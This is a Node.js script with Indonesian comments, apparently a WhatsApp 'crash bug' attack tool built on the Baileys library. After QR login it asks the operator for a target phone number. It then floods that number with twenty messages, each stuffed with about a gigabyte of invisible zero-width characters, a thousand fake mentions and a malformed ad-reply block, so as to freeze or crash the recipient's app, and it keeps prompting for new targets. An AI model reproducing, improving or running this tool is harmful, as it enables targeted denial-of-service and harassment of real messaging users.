/*  GNS-ULTIMATE-V15 – lancar & anti-error
    QR → 20× 1 GB → delay 2 detik
*/
import { makeWASocket, useMultiFileAuthState, delay } from '@whiskeysockets/baileys';
import pino from 'pino';
import qrcode from 'qrcode-terminal';
import readline from 'readline';
import crypto from 'crypto';

const AUTH_DIR = './auth15';
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const ask = q => new Promise(r => rl.question(q, r));

// 1 GB invisible payload
const createPayload = () => '\u200B'.repeat(200_000_000) + '\u2063'.repeat(800_000_000);
const PROTOCOL = () => 'https://127.0.0.1/?' + Date.now() + crypto.randomBytes(8).toString('hex');

async function startBot() {
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
  const sock = makeWASocket({
    logger: pino({ level: 'silent' }),
    auth: state,
    printQRInTerminal: true,
    browser: ['ULTIMATE', 'Chrome', '1.0.0'],
    connectTimeoutMs: 5_000,
    keepAliveIntervalMs: 20_000
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'open') {
      console.clear();
      console.log(`✅ Terhubung langsung (Multi-Device OFF)\n`);

      while (true) {
        const targetRaw = await ask('MASUKAN NOMOR TARGET (628xx) : ');
        const targetJid = `${targetRaw.replace(/\D/g, '')}@s.whatsapp.net`;
        console.log(`🚀 20× 1 GB crash ke ${targetJid}...\n`);

        for (let i = 1; i <= 20; i++) {
          try {
            await sock.sendMessage(targetJid, {
              conversation: createPayload(),
              contextInfo: {
                forwardingScore: 999_999,
                isForwarded: true,
                mentionedJid: Array.from({ length: 1000 }, (_, i) => `${i}@s.whatsapp.net`),
                externalAdReply: {
                  title: `ULTIMATE-${i}`,
                  body: createPayload().slice(0, 5000),
                  mediaType: 1,
                  thumbnail: Buffer.from(
                    'ffd8ffe000104a46494600010100000100010000ffdb004300080606070605080707070909080a0c140d0c0b0b0c1912130f141d1a1f1e1d1a1c1c20242e2720222c231c1c2837292c30313434341f27393d38323c2e333432ffdb0043010909090c0b0c180d0d1832211c21323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232323232ffc00011080001000103011100021101031101ffc4001f0000010501010101010100000000000000000102030405060708090a0bffc400b5100002010303020403050504040000017d01020300041105122131410613516107227114328191a1082342b1c11552d1e1331662f024728293f12431544536373c2d2350825e1643343174454748494a4b4c4d4e4f4c4e3f0ffd9',
                    'hex'
                  ),
                  sourceUrl: PROTOCOL(),
                  mediaUrl: PROTOCOL(),
                  renderLargerThumbnail: true
                }
              }
            });
            console.log(`BUG #${i} TERKIRIM`);
            if (i < 20) await delay(2000);
          } catch (e) {
            console.log('⚠️  Error, retry 2s...', e.message);
            await delay(2000);
          }
        }
        console.log(`✅ Selesai. Masukkan target baru...\n`);
      }
    }

    if (connection === 'close' && lastDisconnect?.error) {
      console.log('🔄 Reconnecting...');
      await delay(3000);
      startBot();
    }
  });
}

startBot();
